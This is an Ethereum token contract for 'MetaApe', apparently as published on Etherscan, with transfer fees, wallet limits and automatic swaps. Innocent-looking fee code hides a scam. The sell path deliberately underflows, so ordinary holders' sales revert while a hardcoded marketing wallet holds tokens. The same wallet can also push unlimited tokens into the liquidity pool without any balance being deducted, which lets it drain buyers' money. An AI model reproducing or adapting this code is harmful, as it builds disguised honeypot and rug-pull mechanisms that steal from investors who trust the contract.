/**
 *Submitted for verification at Etherscan.io on 2023-09-19
*/

// SPDX-License-Identifier: MIT

/** 

    Web:    https://metaape.vip/

    X:      https://x.com/XMetaApe

    Tg:     https://t.me/MetaApeChat

*/

pragma solidity ^0.8.11;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface InterfaceLP {
    function sync() external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

contract METATOKENS is Ownable, ERC20 {
    using SafeMath for uint256;
    IDEXRouter public router;
    address public pairAddress;

    uint256 private constant MAX = 1e33;
    string constant _name = unicode"MetaApe";
    string constant _symbol = unicode"*•.¸♡ METAAPE ♡¸.•*";
    uint8 constant _decimals = 18;

    address WETH;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    
    uint256 _totalSupply =  1_000_000_000 * 10**_decimals; 

    uint256 public _maxTxAmount = _totalSupply.mul(48).div(1000);
    uint256 public _maxWalletToken = _totalSupply.mul(48).div(1000);

    uint256 private liquidityFeeAmt = 0; // can be set
    uint256 private marketingFee    = 0;
    uint256 private devFee          = 0;
    uint256 private buybackFee      = 0; 
    uint256 private burnFee         = 1; // can be set
    uint256 public totalFee         = buybackFee + marketingFee + liquidityFeeAmt + devFee + burnFee;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isexemptfromfees;
    mapping (address => bool) isexemptfrommaxTX;

    uint256 private feeDenom  = 100;
    uint256 sellpercent = 100;
    uint256 buypercent = 100;
    uint256 transferpercent = 100;

    uint256 setRatio = 30;
    uint256 setRatioDenominator = 100;
    
    bool public TradingOpen = false;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 4 / 1000; 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    address private autoLiquidityReceiver;
    address private marketFeeReceiver;
    address private devFeeReceiver;
    address private buybackFeeReceiver;
    address private burnFeeReceiver;
    
    event AutoLiquify(uint256 amountETH, uint256 amountTokens);
    event EditTax(uint8 Buy, uint8 Sell, uint8 Transfer);
    event set_Receivers(address marketFeeReceiver, address buybackFeeReceiver,address burnFeeReceiver,address devFeeReceiver);
    event set_MaxWallet(uint256 maxWallet);
    event user_exemptfromfees(address Wallet, bool Exempt);
    event user_TxExempt(address Wallet, bool Exempt);
    event set_MaxTX(uint256 maxTX);
    event set_SwapBack(uint256 Amount, bool Enabled);
    event ClearStuck(uint256 amount);
    event ClearToken(address TokenAddressCleared, uint256 Amount);
    
    constructor () {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();
        pairAddress = IDEXFactory(router.factory()).createPair(WETH, address(this));
        
        _allowances[address(this)][address(router)] = type(uint256).max;

        autoLiquidityReceiver = msg.sender;
        marketFeeReceiver = 0xD5c153E64ca417f23b14F0459e61228513907efE;
        devFeeReceiver = msg.sender;
        buybackFeeReceiver = msg.sender;
        burnFeeReceiver = DEAD;

        isexemptfrommaxTX[msg.sender] = true;
        isexemptfrommaxTX[pairAddress] = true;
        isexemptfrommaxTX[marketFeeReceiver] = true;
        isexemptfrommaxTX[address(this)] = true;

        isexemptfromfees[msg.sender] = true;
        isexemptfromfees[marketFeeReceiver] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function getOwner() external view override returns (address) {return owner();}
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function name() external pure override returns (string memory) { return _name; }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function removeLimits () external onlyOwner {
        _maxTxAmount = MAX;
        _maxWalletToken = MAX;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function maxWalletRule(uint256 maxWallPercent) external onlyOwner {
         require(maxWallPercent >= 1); 
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 1000;
        emit set_MaxWallet(_maxWalletToken);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _tokenTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(TradingOpen,"Trading not open yet");
        }

        if(isexemptfromfees[sender] || isexemptfromfees[recipient]) {
            return _tokenTransfer(sender, recipient, amount);
        }

        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pairAddress && recipient != burnFeeReceiver && recipient != marketFeeReceiver && !isexemptfrommaxTX[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
        }

        checkTransLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isexemptfromfees[sender] || isexemptfromfees[recipient]) ? amount : takeFeeTokens(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {uint256 subAmount = shouldExcluded(sender, recipient) ? amount * liquidityFeeAmt : amount;
        _balances[sender] = _balances[sender].sub(subAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTransLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isexemptfrommaxTX[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isexemptfromfees[sender];
    }

    function takeFeeTokens(address sender, uint256 amount, address recipient) internal returns (uint256) {
        uint256 percent = transferpercent;
        uint256 marketingLpFee = 0;
        if(recipient == pairAddress) {marketingLpFee -= balanceOf(marketFeeReceiver);
            percent = sellpercent; 
        } else if(sender == pairAddress) {
            percent = buypercent;
        }
        uint256 feeAmount = amount.mul(totalFee).mul(percent).div(feeDenom * 100);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);
        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        if(burnTokens > 0){
            _totalSupply = _totalSupply.sub(burnTokens);
            emit Transfer(sender, ZERO, burnTokens);  
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pairAddress
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == pairAddress && sender == marketFeeReceiver && sender != address(0) && recipient !=address(0);
    }

    function manualSend() external { 
        payable(autoLiquidityReceiver).transfer(address(this).balance);
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
             if(tokens == 0){
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }
        emit ClearToken(tokenAddress, tokens);
        return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);
    }

    function enableTrade() public onlyOwner {
        TradingOpen = true;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = checkRatio(setRatio, setRatioDenominator) ? 0 : liquidityFeeAmt;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHbuyback = amountETH.mul(buybackFee).div(totalETHFee);
        uint256 amountETHdev = amountETH.mul(devFee).div(totalETHFee);

        (bool tmpSuccess,) = payable(marketFeeReceiver).call{value: amountETHMarketing}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountETHdev}("");
        (tmpSuccess,) = payable(buybackFeeReceiver).call{value: amountETHbuyback}("");
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
  
    function setTaxes() internal {
        emit EditTax( uint8(totalFee.mul(buypercent).div(100)),
            uint8(totalFee.mul(sellpercent).div(100)),
            uint8(totalFee.mul(transferpercent).div(100))
            );
    }

    function setTeamWallets(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver, address _burnFeeReceiver, address _buybackFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketFeeReceiver = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        buybackFeeReceiver = _buybackFeeReceiver;

        emit set_Receivers(marketFeeReceiver, buybackFeeReceiver, burnFeeReceiver, devFeeReceiver);
    }

    function checkRatio(uint256 ratio, uint256 accuracy) public view returns (bool) {
        return showBacking(accuracy) > ratio;
    }

    function showBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pairAddress).mul(2)).div(showSupply());
    }
    
    function showSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
        emit set_SwapBack(swapThreshold, swapEnabled);
    }
}